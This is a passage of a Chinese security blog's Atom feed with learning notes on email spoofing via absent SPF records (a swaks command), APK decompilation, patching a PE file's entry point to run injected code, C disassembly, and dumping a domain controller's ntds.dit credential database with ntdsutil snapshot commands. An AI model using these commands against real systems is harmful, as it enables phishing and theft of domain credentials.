    <content type="html"><![CDATA[<h1 id="SPF"><a href="#SPF" class="headerlink" title="SPF"></a>SPF</h1><p>看网易官方对SPF的定义：<br><img src="/2020/03/23/利用spf伪造邮箱发送/163.png" alt></p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>首先用nslookup命令查看是否存在SPF记录<br><img src="/2020/03/23/利用spf伪造邮箱发送/spf.png" alt></p><p>这里并没有设置SPF，没有SPF字样出现</p><p>Kali启动，输入命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swaks --to xxx@163.com --from test_nospf@xxx.cn  --body &apos;This is a test mailing&apos; --header &apos;Subject: test&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">常用Swaks指令</span><br><span class="line">--ehlo     [helo-string]：伪造ehlo头信息</span><br><span class="line">--header     [header-and-data]：伪造From、Subject、Message-Id、X-Mailer等头信息</span><br><span class="line">--data     [data-portion]：伪造DATA的全部内容，可直接将邮件源码作为选项</span><br><span class="line">--attach     [attachment-specification]：添加附件</span><br></pre></td></tr></table></figure></p><p><img src="/2020/03/23/利用spf伪造邮箱发送/success.png" alt></p><p>发送成功，看邮箱收到没有</p><p><img src="/2020/03/23/利用spf伪造邮箱发送/mail.png" alt></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[你熟悉得那些诱人的邮件都是如何伪造得？ “<a href="https://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&amp;mid=2247483932&amp;idx=1&amp;sn=2fdbd77c441354a3b6a4a4b39c4a234f&amp;chksm=9b370a28ac40833ef7f5773e09ea0d38155e5b673e1a63209e81a5ff4fc9e0d1ecc967a1408c&amp;mpshare=1&amp;scene=1&amp;srcid=0323QOmo5lj78Oc1T5xsiQYc&amp;sharer_sharetime=1584933653495&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=d3059eb8c008ccac8f45b250923aca43ac9c6c49c8267ffb82d154dcea815a41811dbfb26a5eff335dc717d552f2e0d0e9542bb27c9a11e2b2d00b6aebb8f29e79f3ca5b1b42b32a7b48ff156970177c&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10&amp;version=62080085&amp;lang=zh_CN&amp;exportkey=A947Qcj62k29xmJtfgTCZuk%3D&amp;pass_ticket=hFiImDgckOZoXTtlh24T0c93VTdcIgyprkEcstqbILTiVo%2BeNPKDXHJgWazcpizo&quot;" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAwMzc2MDQ3NQ==&amp;mid=2247483932&amp;idx=1&amp;sn=2fdbd77c441354a3b6a4a4b39c4a234f&amp;chksm=9b370a28ac40833ef7f5773e09ea0d38155e5b673e1a63209e81a5ff4fc9e0d1ecc967a1408c&amp;mpshare=1&amp;scene=1&amp;srcid=0323QOmo5lj78Oc1T5xsiQYc&amp;sharer_sharetime=1584933653495&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=d3059eb8c008ccac8f45b250923aca43ac9c6c49c8267ffb82d154dcea815a41811dbfb26a5eff335dc717d552f2e0d0e9542bb27c9a11e2b2d00b6aebb8f29e79f3ca5b1b42b32a7b48ff156970177c&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10&amp;version=62080085&amp;lang=zh_CN&amp;exportkey=A947Qcj62k29xmJtfgTCZuk%3D&amp;pass_ticket=hFiImDgckOZoXTtlh24T0c93VTdcIgyprkEcstqbILTiVo%2BeNPKDXHJgWazcpizo&quot;</a>)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SPF&quot;&gt;&lt;a href=&quot;#SPF&quot; class=&quot;headerlink&quot; title=&quot;SPF&quot;&gt;&lt;/a&gt;SPF&lt;/h1&gt;&lt;p&gt;看网易官方对SPF的定义：&lt;br&gt;&lt;img src=&quot;/2020/03/23/利用spf伪造邮箱发送/163.png&quot; alt&gt;&lt;/
      
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>App反汇编步骤</title>
    <link href="http://sherlocz.github.io/2020/03/23/App%E5%8F%8D%E6%B1%87%E7%BC%96%E6%AD%A5%E9%AA%A4/"/>
    <id>http://sherlocz.github.io/2020/03/23/App反汇编步骤/</id>
    <published>2020-03-23T02:16:15.000Z</published>
    <updated>2020-03-23T02:41:00.521Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul><li>apktool.jar apktool.bat</li><li><p>下载地址：<a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank" rel="noopener">https://ibotpeaches.github.io/Apktool/install/</a></p></li><li><p>dex2jar</p></li><li><p>下载地址：<a href="https://sourceforge.net/projects/dex2jar/" target="_blank" rel="noopener">https://sourceforge.net/projects/dex2jar/</a></p></li><li><p>jd-gui.jar</p></li><li><p>下载地址：<a href="http://jd.benow.ca/" target="_blank" rel="noopener">http://jd.benow.ca/</a></p></li><li><p>完整工具包网盘下载地址</p></li><li><a href="https://pan.baidu.com/s/1u9ZAIlnMMHJx9LWRO7OWcA" target="_blank" rel="noopener">https://pan.baidu.com/s/1u9ZAIlnMMHJx9LWRO7OWcA</a></li></ul><h1 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h1><p>首先将下载好的 apktool.jar和apktool.bat复制到C:/Windows下，因为path当中本身就设置了C:/Windows这个路径在环境变量中，当然你也可以自定义路径。</p><p>进入我们测试apk的目录，在命令行下输入：<strong>apktool d abc.apk</strong><br><img src="/2020/03/23/App反汇编步骤/1.png" alt></p><p>这一步之后我们就可以看到apk中的一些源文件了<br><img src="/2020/03/23/App反汇编步骤/2.png" alt></p><p>然后我们将abc文件夹的文件重新打包成apk，进入abc文件夹，输入命令 <strong>apktool b abc</strong>，默认输出abc,apk文件为当前目录</p><p>然后你会看见abc文件夹下新出了一个dist文件夹，里面就存有我们重新打包好之后的apk<br><img src="/2020/03/23/App反汇编步骤/apk.png" alt></p><p>将apk修改成zip文件，然后解压出其中的<strong>classes.dex</strong>文件，将这个文件复制到<strong>dex2jar</strong>文件夹下面，在命令行下运行 <strong>d2j-dex2jar.bat classes.dex</strong><br><img src="/2020/03/23/App反汇编步骤/d2j.png" alt><br>此时看见目录中多出了一个classes-dex2jar.jar的文件<br><img src="/2020/03/23/App反汇编步骤/jar.png" alt></p><p>最后用jd-gui文件打开这个classes-dex2jar.jar文件，我们就能看见源码了<br><img src="/2020/03/23/App反汇编步骤/code.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;工具&quot;&gt;&lt;a href=&quot;#工具&quot; class=&quot;headerlink&quot; title=&quot;工具&quot;&gt;&lt;/a&gt;工具&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;apktool.jar apktool.bat&lt;/li&gt;
&lt;li&gt;&lt;p&gt;下载地址：&lt;a href=&quot;https://ibotpe
      
    
    </summary>
    
    
    
      <category term="反汇编" scheme="http://sherlocz.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>逆向学习--将messagebox添加到空白区</title>
    <link href="http://sherlocz.github.io/2020/03/21/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-%E5%B0%86messagebox%E6%B7%BB%E5%8A%A0%E5%88%B0%E7%A9%BA%E7%99%BD%E5%8C%BA/"/>
    <id>http://sherlocz.github.io/2020/03/21/逆向学习-将messagebox添加到空白区/</id>
    <published>2020-03-21T08:23:56.000Z</published>
    <updated>2020-03-27T03:04:09.695Z</updated>
    
    <content type="html"><![CDATA[<p>好久没写blog了，但是一直有在学逆向，就是不晓得写什么，感觉很多都是很基础的东西，写的价值不大。</p><p>这里看着教程做了个小小的程序改动，这里自己也来尝试一下吧。</p><ul><li>前置知识：逆向、PE结构、进制</li><li>实现目的：修改OEP(即程序的入口点)，使得程序开始的时候先弹出一个MessageBox然后再运行</li></ul><h1 id="MessageBox"><a href="#MessageBox" class="headerlink" title="MessageBox"></a>MessageBox</h1><p>这个函数简单来说就是弹个小框框,里面的参数我们先不管</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(0, 0, 0, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>VS下进行编译，呼啦啦~<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/MessageBox.png" alt></p><h1 id="E8-E9公式"><a href="#E8-E9公式" class="headerlink" title="E8/E9公式"></a>E8/E9公式</h1><p>知道了作用之后，我们在MessageBox函数这里设置断点，来看反汇编代码<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/E8.png" alt><br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/E9.png" alt></p><p>我这里把汇编代码整理一下更加清楚一点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 地址 #  #   硬编码   #    #                函数                #   #   跳转地址  #</span><br><span class="line">00F71723 E8 E0 FA FF FF    call    @__CheckForDebuggerJustMyCode@4    (0F71208h)</span><br><span class="line">00F71208 E9 63 05 00 00    jmp     __CheckForDebuggerJustMyCode       (0F71770h)</span><br></pre></td></tr></table></figure></p><p>我们可以看出 call命令对应的硬编码为E8，jmp对应的硬编码为E9。那么硬编码后面的四位，和我们跳转的地址是 如何和进行转换的呢。</p><p>上公式：<br><strong>真正要跳转的地址 = E8这条命令的下一行地址 + E8后面的四位</strong></p><p>我们看上面的图可以带入公式里面验证一下</p><p>00F71208 = 00F71728 + FFFFFAE0<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/calc.png" alt></p><p>我们使用计算器计算，发现结论正确。</p><p>又∵ <strong>E8这条命令的下一行地址 = E8的地址 + 硬编码的长度</strong></p><p>所以这条命令就可以变成：</p><p><strong>真正要跳转的地址 = E8的地址 + 硬编码的长度 + E8后面的四位</strong></p><h1 id="写入OEP的代码"><a href="#写入OEP的代码" class="headerlink" title="写入OEP的代码"></a>写入OEP的代码</h1><p>因为我们的程序最终是要用记事本的方式打开修改其中的十六进制数，所以我们不能直接写汇编代码进去的<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/6a.png" alt><br>从反汇编后的汇编代码我们可以看出，首先我们的代码做了4个push，也就是MessageBox这个函数传入的四个参数，我们这里由于全部都是0，所以我们对应push的值也是0<br>最终我们将会加入在OEP后面的十六进制为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6A 00 6A 00 6A 00 6A 00 E8 .. .. .. .. E9 .. .. .. ..</span><br></pre></td></tr></table></figure></p><h1 id="找到文件中的MessageBox地址"><a href="#找到文件中的MessageBox地址" class="headerlink" title="找到文件中的MessageBox地址"></a>找到文件中的MessageBox地址</h1><p>我们的逻辑是这样的，开始运行之后首先跳转到MessageBox，然后jmp到开始的位置重新开始</p><p>这里我拿任意一个软件做例子，用OD打开，然后再右下角输入 <strong>bp MessageBoxA</strong>，点击菜单栏中的那个 <strong>B</strong> 按钮，我们就能发现MessageBox在这个程序中跳转的地址。</p><p>此处的程序为 75D90F40<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/bp.png" alt></p><h1 id="找到我们写入代码的空白区"><a href="#找到我们写入代码的空白区" class="headerlink" title="找到我们写入代码的空白区"></a>找到我们写入代码的空白区</h1><p>我这里打开的程序，这里用PETOOLS观察第一个节的相关数据<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/PE.png" alt><br>这个时候我们要写入的数据空白处开始的位置就是 十六进制的 002558D7 + 400</p><p>所以在这个计算后的位置我们开始写入上面的代码，如图，这里还有E8/E9后面的数没有写<br><img src="/2020/03/21/逆向学习-将messagebox添加到空白区/6AA.png" alt></p><h1 id="通过公式计算出最终写入的代码"><a href="#通过公式计算出最终写入的代码" class="headerlink" title="通过公式计算出最终写入的代码"></a>通过公式计算出最终写入的代码</h1><p>E8:255ce8<br>E9:255ced<br>E8下一行地址：<br>E9下一行地址：<br>MessageBox:75B50F40<br>ImageBase:00400000<br>OEP:002085D8</p><p>E8下一行地址相对PointerToRawData偏移量：0x255ce8+5-0x400=0x2558E8+5<br>映射到内存中，E8下一行地址：ImageBase+VirtualAddress + 0x2558E8+5= 6568E8<br>E8后面的值：MessageBox - 0x6568E8-5 = 0x754FA658 0x754FA653</p><p>计算E9后面的值：<br>原来OEP:ImageBase + AddressOfEntryPoint = 6085D8</p><p>文件中，E9下一行地址相对PointerToRawData偏移量：0x255ced-0x400=0x2558ed +5</p><p>映射到内存中，E9下一行地址：ImageBase + VirtualAddress + 0x2558ed =6568ed</p><p>E9后面的值：MessageBox - 6568ed = 754FA653 754FA64E</p><p>修改OEP:<br>文件中shellcode起始地址相对PointerToRawData偏移量：255ce0 - 400 = 2558E0<br>映射到内存中相对ImageBase偏移：VitualAddress + 2558E0 = 2568e0</p><p>编写就完事了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;好久没写blog了，但是一直有在学逆向，就是不晓得写什么，感觉很多都是很基础的东西，写的价值不大。&lt;/p&gt;
&lt;p&gt;这里看着教程做了个小小的程序改动，这里自己也来尝试一下吧。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;前置知识：逆向、PE结构、进制&lt;/li&gt;
&lt;li&gt;实现目的：修改OEP(即
      
    
    </summary>
    
    
    
      <category term="逆向" scheme="http://sherlocz.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>C语言逆向基础</title>
    <link href="http://sherlocz.github.io/2020/03/03/C%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/"/>
    <id>http://sherlocz.github.io/2020/03/03/C语言逆向基础/</id>
    <published>2020-03-03T12:45:58.000Z</published>
    <updated>2020-03-04T13:09:07.850Z</updated>
    
    <content type="html"><![CDATA[<p>C语言反汇编后的代码学习</p><p>C语言的基本数据类型：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">char1byte</span><br><span class="line">short2byte</span><br><span class="line">int4byte</span><br><span class="line">long4byte</span><br><span class="line">float4byte</span><br><span class="line">double8byte</span><br></pre></td></tr></table></figure></p><p>汇编堆栈图：<br><img src="/2020/03/03/C语言逆向基础/dzt.png" alt></p><p>从图中我们可以看出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[EBP-4n]局部变量</span><br><span class="line">[EBP+4]返回值</span><br><span class="line">[EBP+8]参数</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><h1 id="利用vs进行反汇编"><a href="#利用vs进行反汇编" class="headerlink" title="利用vs进行反汇编"></a>利用vs进行反汇编</h1><p>首先编写好C语言代码，然后设置断点，F5编译，最后调试-&gt;窗口-&gt;反汇编(寄存器)查看我们想要的东西</p><h1 id="返回值反汇编分析"><a href="#返回值反汇编分析" class="headerlink" title="返回值反汇编分析"></a>返回值反汇编分析</h1><h2 id="char类型的返回值"><a href="#char类型的返回值" class="headerlink" title="char类型的返回值"></a>char类型的返回值</h2><p><img src="/2020/03/03/C语言逆向基础/char.png" alt><br>反汇编之后我们发现，返回值保存在了al寄存器中<br><img src="/2020/03/03/C语言逆向基础/al.png" alt></p><h2 id="short类型的返回值"><a href="#short类型的返回值" class="headerlink" title="short类型的返回值"></a>short类型的返回值</h2><p><img src="/2020/03/03/C语言逆向基础/short.png" alt><br>反汇编之后我们发现，返回值保存在了ax寄存器中<br><img src="/2020/03/03/C语言逆向基础/ax.png" alt></p><h2 id="int类型的返回值"><a href="#int类型的返回值" class="headerlink" title="int类型的返回值"></a>int类型的返回值</h2><p><img src="/2020/03/03/C语言逆向基础/int.png" alt><br>反汇编之后我们发现，返回值保存在了ax寄存器中<br><img src="/2020/03/03/C语言逆向基础/eax.png" alt></p><h1 id="数组反汇编分析"><a href="#数组反汇编分析" class="headerlink" title="数组反汇编分析"></a>数组反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/array_1.png" alt><br><img src="/2020/03/03/C语言逆向基础/array.png" alt><br>特点：等宽连续</p><h1 id="结构体反汇编分析"><a href="#结构体反汇编分析" class="headerlink" title="结构体反汇编分析"></a>结构体反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/jgt.png" alt><br><img src="/2020/03/03/C语言逆向基础/jgtt.png" alt><br>特点：不一定等宽但一定连续</p><h1 id="if语句反汇编分析"><a href="#if语句反汇编分析" class="headerlink" title="if语句反汇编分析"></a>if语句反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/if.png" alt><br><img src="/2020/03/03/C语言逆向基础/iff.png" alt><br>其实if的反汇编就是jcc判断跳转到哪里的内存地址</p><h1 id="do-while语句反汇编分析"><a href="#do-while语句反汇编分析" class="headerlink" title="do..while语句反汇编分析"></a>do..while语句反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/do_while.png" alt><br><img src="/2020/03/03/C语言逆向基础/do_whilee.png" alt></p><h1 id="for语句反汇编分析"><a href="#for语句反汇编分析" class="headerlink" title="for语句反汇编分析"></a>for语句反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/forr.png" alt><br>这里可以调试看的更加的清楚，首先跳转到for循环内部，然后将x的值传给eax再传给[ebp-8]也就是参数，第一次会直接跳到和y相比较，比较大小如果比y小则会跳转到printf那里，然后会[add esp,8] 这里的意思是删除栈顶的两个参数x,y，然后跳入到for循环内部，这个时候第二次进入x+1，也就是i++，后面一直循环这个操作，直到x&gt;y为止。</p><h1 id="switch语句反汇编分析"><a href="#switch语句反汇编分析" class="headerlink" title="switch语句反汇编分析"></a>switch语句反汇编分析</h1><h2 id="case-lt-3"><a href="#case-lt-3" class="headerlink" title="case&lt;=3"></a>case&lt;=3</h2><p><img src="/2020/03/03/C语言逆向基础/case3.png" alt><br><img src="/2020/03/03/C语言逆向基础/case33.png" alt><br>当我们的case情况较少的时候，发现反汇编的代码和我们if..else的反汇编代码一样，都是通过jcc比较跳转地址</p><p>##case&gt;3##<br>这里的情况复杂一些<br><img src="/2020/03/03/C语言逆向基础/case4.png" alt><br><img src="/2020/03/03/C语言逆向基础/case44.png" alt><br>反汇编的时候我们看见，首先将我们传入的参数复制给了eax，然后将eax的值给了[ebp-0C4h],最后给了ecx，然后ecx-1,最后又传回给了[ebp-0C4h]，然后这里我们与3进行比较，若比3大，则会跳转到0DA436Ah(直接跳出判断语句，因为这里switch的最大值为4,若减了1还比4大，则就会进入default)，若这个条件不成立，则会将值赋给edx，跳转到[edx*4+0DA4380h]。</p><p>这里反汇编里面搞了这么多的骚操作，原因是为了减少判断的次数直接判断出进入哪一个case，害。</p><p>当然，这里的sub并不是每次都是1，这里和你case中的数是相关的。</p><p>而switch的反汇编是非常复杂的，是编译器来进行了操作，编译器非常的聪明，这里就不一一分析了。</p><p>写的非常粗糙，害。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;C语言反汇编后的代码学习&lt;/p&gt;
&lt;p&gt;C语言的基本数据类型：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;spa
      
    
    </summary>
    
    
    
      <category term="汇编" scheme="http://sherlocz.github.io/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>Windows下ntds.dit的利用</title>
    <link href="http://sherlocz.github.io/2020/02/28/Windows%E4%B8%8Bntds-dit%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <id>http://sherlocz.github.io/2020/02/28/Windows下ntds-dit的利用/</id>
    <published>2020-02-28T12:14:10.000Z</published>
    <updated>2020-02-28T12:40:39.121Z</updated>
    
    <content type="html"><![CDATA[<p>ntds.dit是windows下的一个文件，里面存放了域内机器的一些信息，但是就算是域控的账号也无法直接读取出来。这里讲讲提取的方式和读取的方式。</p><p><img src="/2020/02/28/Windows下ntds-dit的利用/n.png" alt><br>无法直接读取</p><p>记笔记记笔记~</p><h1 id="提取ntds-dit"><a href="#提取ntds-dit" class="headerlink" title="提取ntds.dit"></a>提取ntds.dit</h1><ul><li>ntdsutil.exe: Windows Server 2003/08/12</li><li>vssadmin: Windows 7/Windows Server 2008</li></ul><p>这里用12的机器做示范：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit//创建一个快照</span><br></pre></td></tr></table></figure><p>快照包含Windows中的所有文件，并且复制的时候不会影响Windows本机，也不会受到限制<br><img src="/2020/02/28/Windows下ntds-dit的利用/1.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit//加载快照</span><br></pre></td></tr></table></figure><p><img src="/2020/02/28/Windows下ntds-dit的利用/2.png" alt><br>这个时候会映射出一个文件夹出来，GUID为每次生成镜像的GUID</p><p>然后用命令将ntds.dit复制出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202002282030_VOLUMEC$\windows\ntds\ntds.dit</span><br><span class="line"> c:\temp\ntds.dit</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/28/Windows下ntds-dit的利用/3.png" alt></p><p>最后删除卸载快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p><img src="/2020/02/28/Windows下ntds-dit的利用/4.png" alt></p><p>执行以下命令，若List为空，则说明卸载成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/28/Windows下ntds-dit的利用/5.png" alt></p><p>这就是ntdsutil的用法，win7下没有这个工具，需要利用vssadmin，这里没有win7域控的环境就先不搞了<br><img src="/2020/02/28/Windows下ntds-dit的利用/win7.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ntds.dit是windows下的一个文件，里面存放了域内机器的一些信息，但是就算是域控的账号也无法直接读取出来。这里讲讲提取的方式和读取的方式。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/02/28/Windows下ntds-dit的利用/n.png&quot; alt&gt;&lt;b
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>堆栈图练习</title>
    <link href="http://sherlocz.github.io/2020/02/26/%E5%A0%86%E6%A0%88%E5%9B%BE%E7%BB%83%E4%B9%A0/"/>
    <id>http://sherlocz.github.io/2020/02/26/堆栈图练习/</id>
    <published>2020-02-26T12:50:21.000Z</published>
    <updated>2020-02-28T06:04:00.553Z</updated>
    
    <content type="html"><![CDATA[<p>最近学了好多东西但是懒得写，感觉太懒了，最近学习了堆栈，实在是东西太多啦，这里做个笔记，也没啥观赏性。</p><ul><li>DTDebug</li><li>HelloWorld.exe</li></ul><p>目标开始地址：0x401168<br><img src="/2020/02/26/堆栈图练习/1.png" alt><br>从这个地址的三行汇编代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUSH 2//将十六进制的2存储到堆栈中</span><br><span class="line">PUSH 1//将十六进制的1存储到堆栈中</span><br><span class="line">CALL HelloWor.0040100A//goto这个地址</span><br></pre></td></tr></table></figure></p><p>这里的栈顶和栈底(也就是ESP和EBP的值):<br>ESP 0019FFE4<br>EBP 0019FF30 </p><p>call命令的时候会存入一个内存地址，就是call这行的内存地址加上占用的字节，这里call命令占用了5个字节，所以将会在堆栈中保存当前内存+5的地址，也就是会保存(0040116C+5)401171</p><p>call命令会将call后面的地址给EIP并会跳转到这个地址，所以我们的EIP地址将会为0040100A</p><p>由于push和call的时候要入栈，所以这里我们的栈顶的值会变化</p><p>所以我们这里可以画出堆栈图<br><img src="/2020/02/26/堆栈图练习/2.png" alt></p><p>然后跳转到了40100A地址，这一行看到了JMP<br><img src="/2020/02/26/堆栈图练习/3.png" alt></p><p>JMP命令只会修改EIP的值，堆栈并不改变，然后会继续走下去到401040<br><img src="/2020/02/26/堆栈图练习/4.png" alt></p><p>这里接下来一直到RETN就是我们剩下要分析的汇编代码</p><p>首先<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUSH EBP</span><br></pre></td></tr></table></figure></p><p>将EBP的值入栈，栈顶的值-4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV EBP,ESP</span><br></pre></td></tr></table></figure><p>将ESP的值赋予给EBP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUB ESP,40</span><br></pre></td></tr></table></figure><p>ESP的值减去十六进制的四十，这里其实就是栈顶要增加，这一步的原因是为了流出缓存出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUSH EBX</span><br><span class="line">PUSH ESP</span><br><span class="line">PUSH EDI</span><br></pre></td></tr></table></figure><p>将 EBX、ESP、EDI的值入栈，栈顶+12</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LEA EDI,DWORD PTR SS:[EBP-40]</span><br></pre></td></tr></table></figure><p>将EBP-40的地址赋值给EDI</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOV ECX,10</span><br><span class="line">MOV EAX,CCCCCCCC</span><br><span class="line">REP STOS DWORD PTR ES:[EDI]</span><br></pre></td></tr></table></figure><p>这一步的目的是为了清除多余的垃圾缓存，重复十次，将值赋值成CCCCCCCC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX,DWORD PTR SS:[EBP+8]</span><br><span class="line">ADD EAX,DWORD PTR SS:[EBP+C]</span><br></pre></td></tr></table></figure><p>这两步的意思就是将我们刚存进来的1和2相加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POP EDI</span><br><span class="line">POP ESI</span><br><span class="line">POP EBX</span><br><span class="line">MOV ESP,EBP</span><br><span class="line">POP EBP</span><br><span class="line">RETN</span><br></pre></td></tr></table></figure><p>清除缓存，就不详细分析了</p><p>这里就会返回到刚开始CALL后的下一行<br><img src="/2020/02/26/堆栈图练习/4.png" alt><br>这里有一个ADD操作，因为到这一步的时候栈顶和栈底的值和刚开始的时候不一样，要恢复成刚开始的样子，这一步叫做堆栈平衡</p><p>完~</p><p>图不画了~懒<br><img src="/2020/02/26/堆栈图练习/6.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近学了好多东西但是懒得写，感觉太懒了，最近学习了堆栈，实在是东西太多啦，这里做个笔记，也没啥观赏性。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DTDebug&lt;/li&gt;
&lt;li&gt;HelloWorld.exe&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;目标开始地址：0x401168&lt;br&gt;&lt;img sr
      
    
    </summary>
    
    
    
      <category term="汇编" scheme="http://sherlocz.github.io/tags/%E6%B1%87%E7%BC%96/"/>
    
      <category term="逆向" scheme="http://sherlocz.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-4878 Flash漏洞复现</title>
    <link href="http://sherlocz.github.io/2020/02/15/CVE-2018-4878-Flash%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
